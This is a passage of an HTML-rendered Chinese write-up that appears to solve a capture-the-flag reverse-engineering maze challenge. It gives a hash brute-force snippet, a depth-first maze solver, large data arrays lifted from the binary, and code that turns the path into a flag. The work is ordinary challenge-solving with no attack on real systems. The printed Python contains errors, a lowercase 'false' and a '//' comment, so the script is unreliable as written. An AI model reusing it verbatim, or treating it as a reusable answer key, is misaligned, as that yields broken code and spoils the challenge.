class="number">0xff</span>) ^ ((<span class="number">0x1000193</span> * (((v7 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>) ^ ((<span class="number">0x1000193</span> * (((v7 &amp; <span class="number">0xFF</span>) ^ <span class="number">0x50C5D1F</span>) &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span>))) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">v9 = ((v7 &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xff</span>) ^ ((<span class="number">0x1000193</span> * v8) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"><span class="keyword">if</span> v9 == <span class="number">0x618ff339</span>:</span><br><span class="line"><span class="built_in">print</span>(v7)</span><br><span class="line"><span class="comment">#20</span></span><br></pre></td></tr></table></figure><p>迷宫出口是20，20。判断的条件Label12是位置和两个数组的异或，网上找了一段大佬的走迷宫算法改一下，便可以求出来flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">dirs=[(<span class="number">0</span>,<span class="number">1</span>),(<span class="number">1</span>,<span class="number">0</span>),(<span class="number">0</span>,-<span class="number">1</span>),(-<span class="number">1</span>,<span class="number">0</span>)] <span class="comment">#当前位置四个方向的偏移量</span></span><br><span class="line">path=[]              <span class="comment">#存找到的路径</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mark</span>(<span class="params">maze,pos</span>):  <span class="comment">#给迷宫maze的位置pos标&quot;-1&quot;表示“到过了”</span></span><br><span class="line">    maze[pos[<span class="number">0</span>]][pos[<span class="number">1</span>]]=-<span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">passable</span>(<span class="params">maze,pos</span>): <span class="comment">#检查迷宫maze的位置pos是否可通行</span></span><br><span class="line">    <span class="keyword">if</span> (pos[<span class="number">0</span>] &gt;= <span class="number">21</span> <span class="keyword">or</span> pos[<span class="number">0</span>] &lt; <span class="number">0</span> <span class="keyword">or</span> pos[<span class="number">1</span>] &gt;= <span class="number">21</span> <span class="keyword">or</span> pos[<span class="number">1</span>] &lt; <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> false</span><br><span class="line">    <span class="keyword">return</span> maze[pos[<span class="number">0</span>]][pos[<span class="number">1</span>]] ^ pos[<span class="number">0</span>] ^ (pos[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) == <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">maze,pos,end</span>):</span><br><span class="line">    mark(maze,pos)</span><br><span class="line">    <span class="keyword">if</span> pos==end:</span><br><span class="line">        <span class="built_in">print</span>(pos,end=<span class="string">&quot; &quot;</span>)  <span class="comment">#已到达出口，输出这个位置。成功结束</span></span><br><span class="line">        path.append(pos)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):      <span class="comment">#否则按四个方向顺序检查</span></span><br><span class="line">        nextp=pos[<span class="number">0</span>]+dirs[i][<span class="number">0</span>],pos[<span class="number">1</span>]+dirs[i][<span class="number">1</span>]</span><br><span class="line">        <span class="comment">#考虑下一个可能方向</span></span><br><span class="line">        <span class="keyword">if</span> passable(maze,nextp):        <span class="comment">#不可行的相邻位置不管</span></span><br><span class="line">            <span class="keyword">if</span> find_path(maze,nextp,end):<span class="comment">#如果从nextp可达出口，输出这个位置，成功结束</span></span><br><span class="line">                <span class="built_in">print</span>(pos,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">                path.append(pos)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">see_path</span>(<span class="params">maze,path</span>):     <span class="comment">#使寻找到的路径可视化</span></span><br><span class="line">    <span class="keyword">for</span> i,p <span class="keyword">in</span> <span class="built_in">enumerate</span>(path):</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">            maze[p[<span class="number">0</span>]][p[<span class="number">1</span>]] =<span class="string">&quot;E&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> i==<span class="built_in">len</span>(path)-<span class="number">1</span>:</span><br><span class="line">            maze[p[<span class="number">0</span>]][p[<span class="number">1</span>]]=<span class="string">&quot;S&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[p[<span class="number">0</span>]][p[<span class="number">1</span>]] =-<span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(path) - <span class="number">1</span>):</span><br><span class="line">        dx = path[i + <span class="number">1</span>][<span class="number">0</span>] - path[i][<span class="number">0</span>]   //后状态减去前状态。</span><br><span class="line">        dy = path[i + <span class="number">1</span>][<span class="number">1</span>] - path[i][<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> dx == <span class="number">1</span>:</span><br><span class="line">            flag += <span class="string">&quot;h&quot;</span></span><br><span class="line">        <span class="keyword">if</span> dx == -<span class="number">1</span>:</span><br><span class="line">            flag += <span class="string">&quot;j&quot;</span></span><br><span class="line">        <span class="keyword">if</span> dy == -<span class="number">1</span>:</span><br><span class="line">            flag += <span class="string">&quot;l&quot;</span></span><br><span class="line">        <span class="keyword">if</span> dy == <span class="number">1</span>:</span><br><span class="line">            flag += <span class="string">&quot;k&quot;</span> </span><br><span class="line">    <span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    byte_404208 = [<span class="number">0x45</span>, <span class="number">0x24</span>, <span class="number">0xBD</span>, <span class="number">0x3E</span>, <span class="number">0x32</span>, <span class="number">0x9D</span>, <span class="number">0x8F</span>, <span class="number">0x53</span>, <span class="number">0xCC</span>, <span class="number">0x4F</span>, <span class="number">0x8D</span>, <span class="number">0x2C</span>, <span class="number">0x7C</span>, <span class="number">0xF2</span>, <span class="number">0xBA</span>, <span class="number">0x30</span>, <span class="number">0x0D</span>, <span class="number">0xC7</span>, <span class="number">0x57</span>, <span class="number">0x19</span>, <span class="number">0x91</span>, <span class="number">0xF4</span>, <span class="number">0xE6</span>, <span class="number">0x28</span>, <span class="number">0x4F</span>, <span class="number">0xEE</span>, <span class="number">0x47</span>, <span class="number">0x7C</span>, <span class="number">0xD8</span>, <span class="number">0xF8</span>, <span class="number">0xD8</span>, <span class="number">0x79</span>, <span class="number">0xD1</span>, <span class="number">0x7A</span>, <span class="number">0x32</span>, <span class="number">0x82</span>, <span class="number">0xD9</span>, <span class="number">0xDF</span>, <span class="number">0x20</span>, <span class="number">0xD6</span>, <span class="number">0xEF</span>, <span class="number">0x5E</span>, <span class="number">0x24</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0xB4</span>, <span class="number">0x9D</span>, <span class="number">0x49</span>, <span class="number">0xCA</span>, <span class="number">0xDD</span>, <span class="number">0x64</span>, <span class="number">0x9D</span>, <span class="number">0x0E</span>, <span class="number">0x2F</span>, <span class="number">0x0E</span>, <span class="number">0xBD</span>, <span class="number">0x1B</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0x6B</span>, <span class="number">0x5F</span>, <span class="number">0xA1</span>, <span class="number">0xAC</span>, <span class="number">0x0E</span>, <span class="number">0x66</span>, <span class="number">0x76</span>, <span class="number">0x3F</span>, <span class="number">0xBF</span>, <span class="number">0x80</span>, <span class="number">0x94</span>, <span class="number">0x86</span>, <span class="number">0x44</span>, <span class="number">0xA9</span>, <span class="number">0xB8</span>, <span class="number">0xB8</span>, <span class="number">0xFE</span>, <span class="number">0xB5</span>, <span class="number">0x1A</span>, <span class="number">0x94</span>, <span class="number">0x6F</span>, <span class="number">0x3B</span>, <span class="number">0x64</span>, <span class="number">0xF6</span>, <span class="number">0x82</span>, <span class="number">0x76</span>, <span class="number">0x0A</span>, <span class="number">0x28</span>, <span class="number">0xAB</span>, <span class="number">0x8D</span>, <span class="number">0xB7</span>, <span class="number">0xB7</span>, <span class="number">0xC1</span>, <span class="number">0x0F</span>, <span class="number">0x1A</span>, <span class="number">0x3A</span>, <span class="number">0xFC</span>, <span class="number">0x77</span>, <span class="number">0x71</span>, <span class="number">0xE6</span>, <span class="number">0x5F</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0x83</span>, <span class="number">0xAF</span>, <span class="number">0x32</span>, <span class="number">0x9D</span>, <span class="number">0x43</span>, <span class="number">0xD6</span>, <span class="number">0xD0</span>, <span class="number">0x9B</span>, <span class="number">0x14</span>, <span class="number">0xBD</span>, <span class="number">0x78</span>, <span class="number">0xDC</span>, <span class="number">0xD6</span>, <span class="number">0xC2</span>, <span class="number">0x1D</span>, <span class="number">0x54</span>, <span class="number">0xB3</span>, <span class="number">0xCE</span>, <span class="number">0xF8</span>, <span class="number">0x71</span>, <span class="number">0x92</span>, <span class="number">0x44</span>, <span class="number">0x85</span>, <span class="number">0xA2</span>, <span class="number">0x58</span>, <span class="number">0xEF</span>, <span class="number">0x80</span>, <span class="number">0x2F</span>, <span class="number">0xF0</span>, <span class="number">0x90</span>, <span class="number">0xF4</span>, <span class="number">0xAB</span>, <span class="number">0xDB</span>, <span class="number">0x63</span>, <span class="number">0x74</span>, <span class="number">0xE1</span>, <span class="number">0xBB</span>, <span class="number">0xCA</span>, <span class="number">0xC5</span>, <span class="number">0xAC</span>, <span class="number">0x39</span>, <span class="number">0xA7</span>, <span class="number">0x56</span>, <span class="number">0x45</span>, <span class="number">0x25</span>, <span class="number">0xAA</span>, <span class="number">0xCA</span>, <span class="number">0x2A</span>, <span class="number">0x30</span>, <span class="number">0x95</span>, <span class="number">0xDC</span>, <span class="number">0x17</span>, <span class="number">0x31</span>, <span class="number">0x4F</span>, <span class="number">0x62</span>, <span class="number">0x39</span>, <span class="number">0xA4</span>, <span class="number">0x1C</span>, <span class="number">0x93</span>, <span class="number">0xE1</span>, <span class="number">0xA9</span>, <span class="number">0x2F</span>, <span class="number">0xB3</span>, <span class="number">0x4F</span>, <span class="number">0x26</span>, <span class="number">0x53</span>, <span class="number">0x47</span>, <span class="number">0x23</span>, <span class="number">0xDB</span>, <span class="number">0x34</span>, <span class="number">0xDE</span>, <span class="number">0xC1</span>, <span class="number">0x27</span>, <span class="number">0x5F</span>, <span class="number">0xEB</span>, <span class="number">0x2E</span>, <span class="number">0x91</span>, <span class="number">0x5E</span>, <span class="number">0xCA</span>, <span class="number">0xCB</span>, <span class="number">0xD6</span>, <span class="number">0x11</span>, <span class="number">0xA3</span>, <span class="number">0x8F</span>, <span class="number">0x47</span>, <span class="number">0xDD</span>, <span class="number">0xC0</span>, <span class="number">0xFB</span>, <span class="number">0xEE</span>, <span class="number">0xCF</span>, <span class="number">0xC9</span>, <span class="number">0xCA</span>, <span class="number">0xD9</span>, <span class="number">0xF8</span>, <span class="number">0xB9</span>, <span class="number">0x15</span>, <span class="number">0x34</span>, <span class="number">0x23</span>, <span class="number">0x6B</span>, <span class="number">0x6D</span>, <span class="number">0x28</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x1E</span>, <span class="number">0xF8</span>, <span class="number">0xFF</span>, <span class="number">0xEB</span>, <span class="number">0xFB</span>, <span class="number">0xE9</span>, <span class="number">0x70</span>, <span class="number">0x5C</span>, <span class="number">0xD4</span>, <span class="number">0xED</span>, <span class="number">0x78</span>, <span class="number">0xD4</span>, <span class="number">0x7A</span>, <span class="number">0x22</span>, <span class="number">0x1C</span>, <span class="number">0x69</span>, <span class="number">0xF1</span>, <span class="number">0x39</span>, <span class="number">0x61</span>, <span class="number">0xC2</span>, <span class="number">0xB9</span>, <span class="number">0x7B</span>, <span class="number">0xF3</span>, <span class="number">0xC2</span>, <span class="number">0xA2</span>, <span class="number">0x99</span>, <span class="number">0x64</span>, <span class="number">0x48</span>, <span class="number">0xAC</span>, <span class="number">0x38</span>, <span class="number">0x55</span>, <span class="number">0x0C</span>, <span class="number">0xB3</span>, <span class="number">0x0B</span>, <span class="number">0xD6</span>, <span class="number">0x9B</span>, <span class="number">0x46</span>, <span class="number">0x70</span>, <span class="number">0x8B</span>, <span class="number">0xCD</span>, <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0xCB</span>, <span class="number">0x7F</span>, <span class="number">0xE0</span>, <span class="number">0xAB</span>, <span class="number">0x4A</span>, <span class="number">0xCB</span>, <span class="number">0x79</span>, <span class="number">0x43</span>, <span class="number">0xE2</span>, <span class="number">0x60</span>, <span class="number">0x15</span>, <span class="number">0x0A</span>, <span class="number">0x7C</span>, <span class="number">0x0A</span>, <span class="number">0xD9</span>, <span class="number">0x15</span>, <span class="number">0x41</span>, <span class="number">0xF3</span>, <span class="number">0x2C</span>, <span class="number">0x2C</span>, <span class="number">0x61</span>, <span class="number">0x14</span>, <span class="number">0xC1</span>, <span class="number">0x43</span>, <span class="number">0xA5</span>, <span class="number">0x1A</span>, <span class="number">0xC7</span>, <span class="number">0x33</span>, <span class="number">0xC9</span>, <span class="number">0x89</span>, <span class="number">0xB7</span>, <span class="number">0x37</span>, <span class="number">0xC4</span>, <span class="number">0x57</span>, <span class="number">0x81</span>, <span class="number">0x23</span>, <span class="number">0xCA</span>, <span class="number">0xD4</span>, <span class="number">0xF1</span>, <span class="number">0x7E</span>, <span class="number">0xF4</span>, <span class="number">0x65</span>, <span class="number">0x8D</span>, <span class="number">0x72</span>, <span class="number">0x6B</span>, <span class="number">0xA4</span>, <span class="number">0x9A</span>, <span class="number">0xEE</span>, <span class="number">0xAC</span>, <span class="number">0xBA</span>, <span class="number">0x71</span>, <span class="number">0x4E</span>, <span class="number">0xDE</span>, <span class="number">0x6A</span>, <span class="number">0x88</span>, <span class="number">0x36</span>, <span class="number">0x1D</span>, <span class="number">0x72</span>, <span class="number">0xB1</span>, <span class="number">0xF0</span>, <span class="number">0x9B</span>, <span class="number">0x69</span>, <span class="number">0x19</span>, <span class="number">0xB0</span>, <span class="number">0x7C</span>, <span class="number">0xEA</span>, <span class="number">0xF7</span>, <span class="number">0x51</span>, <span class="number">0x62</span>, <span class="number">0xD1</span>, <span class="number">0x3A</span>, <span class="number">0x67</span>, <span class="number">0x56</span>, <span class="number">0x66</span>, <span class="number">0xBA</span>, <span class="number">0x79</span>, <span class="number">0x59</span>, <span class="number">0x66</span>, <span class="number">0xB1</span>, <span class="number">0xC5</span>, <span class="number">0x8F</span>, <span class="number">0xE9</span>, <span class="number">0x6C</span>, <span class="number">0x99</span>, <span class="number">0x3C</span>, <span class="number">0xF0</span>, <span class="number">0x89</span>, <span class="number">0xF6</span>, <span class="number">0xBF</span>, <span class="number">0x15</span>, <span class="number">0x61</span>, <span class="number">0x92</span>, <span class="number">0xE0</span>, <span class="number">0x60</span>, <span class="number">0x3E</span>, <span class="number">0x59</span>, <span class="number">0x35</span>, <span class="number">0x4B</span>, <span class="number">0x1F</span>, <span class="number">0x6F</span>, <span class="number">0x65</span>, <span class="number">0xE4</span>, <span class="number">0x71</span>, <span class="number">0x0D</span>, <span class="number">0x7B</span>, <span class="number">0x6E</span>, <span class="number">0x93</span>, <span class="number">0x14</span>, <span class="number">0x5D</span>, <span class="number">0x4C</span>, <span class="number">0x6F</span>, <span class="number">0x2F</span>, <span class="number">0x52</span>, <span class="number">0xA6</span>, <span class="number">0x5D</span>, <span class="number">0x90</span>, <span class="number">0x7B</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x8D</span>, <span class="number">0x33</span>, <span class="number">0x6B</span>, <span class="number">0x37</span>, <span class="number">0xC4</span>, <span class="number">0x2F</span>, <span class="number">0xBF</span>, <span class="number">0x6F</span>, <span class="number">0xBF</span>, <span class="number">0xA8</span>, <span class="number">0xB3</span>, <span class="number">0x61</span>, <span class="number">0x5C</span>, <span class="number">0xD2</span>, <span class="number">0xC2</span>, <span class="number">0x2D</span>, <span class="number">0xC8</span>, <span class="number">0xF4</span>, <span class="number">0xBB</span>, <span class="number">0xB2</span>, <span class="number">0xD0</span>, <span class="number">0x22</span>, <span class="number">0x9C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>, <span class="number">0x59</span>, <span class="number">0x72</span>, <span class="number">0xAA</span>, <span class="number">0xFD</span>, <span class="number">0x7E</span>, <span class="number">0x67</span>, <span class="number">0x2E</span>, <span class="number">0x61</span>, <span class="number">0xBA</span>, <span class="number">0x6B</span>, <span class="number">0x4B</span>, <span class="number">0x19</span>, <span class="number">0xA6</span>, <span class="number">0xD5</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0xBC</span>, <span class="number">0x91</span>, <span class="number">0xEB</span>, <span class="number">0x42</span>, <span class="number">0xCC</span>, <span class="number">0x72</span>, <span class="number">0xB2</span>, <span class="number">0xC6</span>, <span class="number">0x47</span>, <span class="number">0xA3</span>, <span class="number">0xCC</span>, <span class="number">0xAC</span>, <span class="number">0x6C</span>, <span class="number">0xA8</span>, <span class="number">0xD8</span>, <span class="number">0xCA</span>, <span class="number">0xD2</span>, <span class="number">0x84</span>, <span class="number">0x2B</span>, <span class="number">0x35</span>, <span class="number">0xAB</span>, <span class="number">0xAF</span>, <span class="number">0xC8</span>, <span class="number">0xA5</span>, <span class="number">0x2F</span>, <span class="number">0x7F</span>, <span class="number">0x7F</span>, <span class="number">0xF5</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">    dword_4043C8 = [<span class="number">0x00000044</span>, <span class="number">0x00000124</span>, <span class="number">0x000002BD</span>, <span class="number">0x0000033E</span>, <span class="number">0x00000432</span>, <span class="number">0x0000059D</span>, <span class="number">0x0000068F</span>, <span class="number">0x00000753</span>, <span class="number">0x000008CC</span>, <span class="number">0x0000094F</span>, <span class="number">0x00000A8D</span>, <span class="number">0x00000B2C</span>, <span class="number">0x00000C7C</span>, <span class="number">0x00000DF2</span>, <span class="number">0x00000EBA</span>, <span class="number">0x00000F30</span>, <span class="number">0x0000100D</span>, <span class="number">0x000011C7</span>, <span class="number">0x00001257</span>, <span class="number">0x00001319</span>, <span class="number">0x00001491</span>, <span class="number">0x000000F4</span>, <span class="number">0x000001E7</span>, <span class="number">0x00000229</span>, <span class="number">0x0000034F</span>, <span class="number">0x000004EE</span>, <span class="number">0x00000547</span>, <span class="number">0x0000067C</span>, <span class="number">0x000007D8</span>, <span class="number">0x000008F8</span>, <span class="number">0x000009D8</span>, <span class="number">0x00000A79</span>, <span class="number">0x00000BD1</span>, <span class="number">0x00000C7A</span>, <span class="number">0x00000D32</span>, <span class="number">0x00000E82</span>, <span class="number">0x00000FD9</span>, <span class="number">0x000010DF</span>, <span class="number">0x00001120</span>, <span class="number">0x000012D6</span>, <span class="number">0x000013EE</span>, <span class="number">0x0000145F</span>, <span class="number">0x00000027</span>, <span class="number">0x0000016C</span>, <span class="number">0x00000265</span>, <span class="number">0x000003B7</span>, <span class="number">0x0000049F</span>, <span class="number">0x0000054B</span>, <span class="number">0x000006C8</span>, <span class="number">0x000007DF</span>, <span class="number">0x00000866</span>, <span class="number">0x0000099F</span>, <span class="number">0x00000A0C</span>, <span class="number">0x00000B2D</span>, <span class="number">0x00000C0C</span>, <span class="number">0x00000DBF</span>, <span class="number">0x00000E19</span>, <span class="number">0x00000F83</span>, <span class="number">0x000010F1</span>, <span class="number">0x00001169</span>, <span class="number">0x0000125C</span>, <span class="number">0x000013A3</span>, <span class="number">0x000014AE</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000164</span>, <span class="number">0x00000274</span>, <span class="number">0x0000033D</span>, <span class="number">0x000004BD</span>, <span class="number">0x00000582</span>, <span class="number">0x00000696</span>, <span class="number">0x00000784</span>, <span class="number">0x00000846</span>, <span class="number">0x000009AB</span>, <span class="number">0x00000ABA</span>, <span class="number">0x00000BBA</span>, <span class="number">0x00000CFC</span>, <span class="number">0x00000DB7</span>, <span class="number">0x00000E18</span>, <span class="number">0x00000F96</span>, <span class="number">0x0000106C</span>, <span class="number">0x00001138</span>, <span class="number">0x00001267</span>, <span class="number">0x000013F5</span>, <span class="number">0x00001481</span>, <span class="number">0x00000072</span>, <span class="number">0x0000010E</span>, <span class="number">0x0000022C</span>, <span class="number">0x000003AF</span>, <span class="number">0x00000489</span>, <span class="number">0x000005B3</span>, <span class="number">0x000006B3</span>, <span class="number">0x000007C5</span>, <span class="number">0x0000080B</span>, <span class="number">0x0000091E</span>, <span class="number">0x00000A3E</span>, <span class="number">0x00000BF8</span>, <span class="number">0x00000C73</span>, <span class="number">0x00000D75</span>, <span class="number">0x00000EE2</span>, <span class="number">0x00000F5A</span>, <span class="number">0x00001038</span>, <span class="number">0x0000119A</span>, <span class="number">0x000012E9</span>, <span class="number">0x0000133F</span>, <span class="number">0x00001487</span>, <span class="number">0x000000AA</span>, <span class="number">0x00000137</span>, <span class="number">0x00000298</span>, <span class="number">0x00000346</span>, <span class="number">0x000004D3</span>, <span class="number">0x000005D5</span>, <span class="number">0x0000069E</span>, <span class="number">0x00000711</span>, <span class="number">0x000008B8</span>, <span class="number">0x0000097D</span>, <span class="number">0x00000AD9</span>, <span class="number">0x00000BD3</span>, <span class="number">0x00000CC7</span>, <span class="number">0x00000D18</span>, <span class="number">0x00000E51</span>, <span class="number">0x00000FB7</span>, <span class="number">0x000010CB</span>, <span class="number">0x000011FC</span>, <span class="number">0x00001274</span>, <span class="number">0x00001396</span>, <span class="number">0x00001441</span>, <span class="number">0x00000082</span>, <span class="number">0x000001A5</span>, <span class="number">0x0000025F</span>, <span class="number">0x000003E8</span>, <span class="number">0x00000487</span>, <span class="number">0x00000528</span>, <span class="number">0x000006F7</span>, <span class="number">0x00000797</span>, <span class="number">0x000008F3</span>, <span class="number">0x000009AC</span>, <span class="number">0x00000ADC</span>, <span class="number">0x00000B65</span>, <span class="number">0x00000C73</span>, <span class="number">0x00000DE6</span>, <span class="number">0x00000EBC</span>, <span class="number">0x00000FCD</span>, <span class="number">0x000010C3</span>, <span class="number">0x000011AB</span>, <span class="number">0x0000123F</span>, <span class="number">0x000013A0</span>, <span class="number">0x00001450</span>, <span class="number">0x00000043</span>, <span class="number">0x00000122</span>, <span class="number">0x000002AD</span>, <span class="number">0x000003CD</span>, <span class="number">0x0000042D</span>, <span class="number">0x00000537</span>, <span class="number">0x00000692</span>, <span class="number">0x000007DB</span>, <span class="number">0x00000810</span>, <span class="number">0x00000936</span>, <span class="number">0x00000A49</span>, <span class="number">0x00000B65</span>, <span class="number">0x00000C3E</span>, <span class="number">0x00000DA3</span>, <span class="number">0x00000E1B</span>, <span class="number">0x00000F95</span>, <span class="number">0x000010E6</span>, <span class="number">0x000011AF</span>, <span class="number">0x00001228</span>, <span class="number">0x000013B5</span>, <span class="number">0x00001448</span>, <span class="number">0x0000002F</span>, <span class="number">0x0000015B</span>, <span class="number">0x0000024E</span>, <span class="number">0x0000032A</span>, <span class="number">0x000004D2</span>, <span class="number">0x0000053C</span>, <span class="number">0x000006D6</span>, <span class="number">0x000007C9</span>, <span class="number">0x0000082F</span>, <span class="number">0x00000957</span>, <span class="number">0x00000AE2</span>, <span class="number">0x00000B26</span>, <span class="number">0x00000C98</span>, <span class="number">0x00000D57</span>, <span class="number">0x00000EC3</span>, <span class="number">0x00000FC2</span>, <span class="number">0x000010DE</span>, <span class="number">0x00001118</span>, <span class="number">0x000012AB</span>, <span class="number">0x00001386</span>, <span class="number">0x0000144F</span>, <span class="number">0x000000D5</span>, <span class="number">0x000001C9</span>, <span class="number">0x000002F3</span>, <span class="number">0x000003E7</span>, <span class="number">0x000004C6</span>, <span class="number">0x000005C0</span>, <span class="number">0x000006C2</span>, <span class="number">0x000007D1</span>, <span class="number">0x000008F0</span>, <span class="number">0x000009B0</span>, <span class="number">0x00000A1D</span>, <span class="number">0x00000B3D</span>, <span class="number">0x00000C2A</span>, <span class="number">0x00000D62</span>, <span class="number">0x00000E64</span>, <span class="number">0x00000F20</span>, <span class="number">0x000010FF</span>, <span class="number">0x000011EA</span>, <span class="number">0x00001217</span>, <span class="number">0x000013F0</span>, <span class="number">0x000014F6</span>, <span class="number">0x000000E0</span>, <span class="number">0x000001F0</span>, <span class="number">0x000002E2</span>, <span class="number">0x0000037B</span>, <span class="number">0x00000456</span>, <span class="number">0x000005DE</span>, <span class="number">0x000006E6</span>, <span class="number">0x00000772</span>, <span class="number">0x000008DF</span>, <span class="number">0x00000970</span>, <span class="number">0x00000A29</span>, <span class="number">0x00000B16</span>, <span class="number">0x00000C62</span>, <span class="number">0x00000DFB</span>, <span class="number">0x00000E33</span>, <span class="number">0x00000F6A</span>, <span class="number">0x000010C8</span>, <span class="number">0x000011B2</span>, <span class="number">0x00001271</span>, <span class="number">0x000013F8</span>, <span class="number">0x000014C8</span>, <span class="number">0x000000A9</span>, <span class="number">0x00000192</span>, <span class="number">0x0000026F</span>, <span class="number">0x00000342</span>, <span class="number">0x000004A7</span>, <span class="number">0x00000533</span>, <span class="number">0x0000065F</span>, <span class="number">0x00000707</span>, <span class="number">0x000008B9</span>, <span class="number">0x00000900</span>, <span class="number">0x00000ADC</span>, <span class="number">0x00000B90</span>, <span class="number">0x00000C4C</span>, <span class="number">0x00000D7B</span>, <span class="number">0x00000E81</span>, <span class="number">0x00000FC7</span>, <span class="number">0x00001004</span>, <span class="number">0x0000118D</span>, <span class="number">0x000012C0</span>, <span class="number">0x00001375</span>, <span class="number">0x000014EB</span>, <span class="number">0x000000A7</span>, <span class="number">0x00000147</span>, <span class="number">0x000002C6</span>, <span class="number">0x00000374</span>, <span class="number">0x0000044F</span>, <span class="number">0x000005EE</span>, <span class="number">0x0000066D</span>, <span class="number">0x00000719</span>, <span class="number">0x00000807</span>, <span class="number">0x00000970</span>, <span class="number">0x00000A07</span>, <span class="number">0x00000BD5</span>, <span class="number">0x00000C18</span>, <span class="number">0x00000D4D</span>, <span class="number">0x00000EFE</span>, <span class="number">0x00000F20</span>, <span class="number">0x00001021</span>, <span class="number">0x0000116C</span>, <span class="number">0x00001218</span>, <span class="number">0x000013CC</span>, <span class="number">0x0000144F</span>, <span class="number">0x000000A8</span>, <span class="number">0x00000117</span>, <span class="number">0x000002CA</span>, <span class="number">0x0000033F</span>, <span class="number">0x000004C5</span>, <span class="number">0x00000585</span>, <span class="number">0x000006BB</span>, <span class="number">0x0000073A</span>, <span class="number">0x000008C8</span>, <span class="number">0x0000095A</span>, <span class="number">0x00000A8D</span>, <span class="number">0x00000B2F</span>, <span class="number">0x00000CC6</span>, <span class="number">0x00000DD8</span>, <span class="number">0x00000EFD</span>, <span class="number">0x00000F73</span>, <span class="number">0x000010F8</span>, <span class="number">0x00001168</span>, <span class="number">0x00001280</span>, <span class="number">0x0000137E</span>, <span class="number">0x00001466</span>, <span class="number">0x000000AA</span>, <span class="number">0x00000194</span>, <span class="number">0x000002E0</span>, <span class="number">0x000003A2</span>, <span class="number">0x000004B4</span>, <span class="number">0x0000057F</span>, <span class="number">0x00000640</span>, <span class="number">0x000007D0</span>, <span class="number">0x00000865</span>, <span class="number">0x00000986</span>, <span class="number">0x00000A38</span>, <span class="number">0x00000B13</span>, <span class="number">0x00000C7C</span>, <span class="number">0x00000DBF</span>, <span class="number">0x00000EFE</span>, <span class="number">0x00000F95</span>, <span class="number">0x00001066</span>, <span class="number">0x00001117</span>, <span class="number">0x000012BE</span>, <span class="number">0x00001373</span>, <span class="number">0x000014E4</span>, <span class="number">0x000000F9</span>, <span 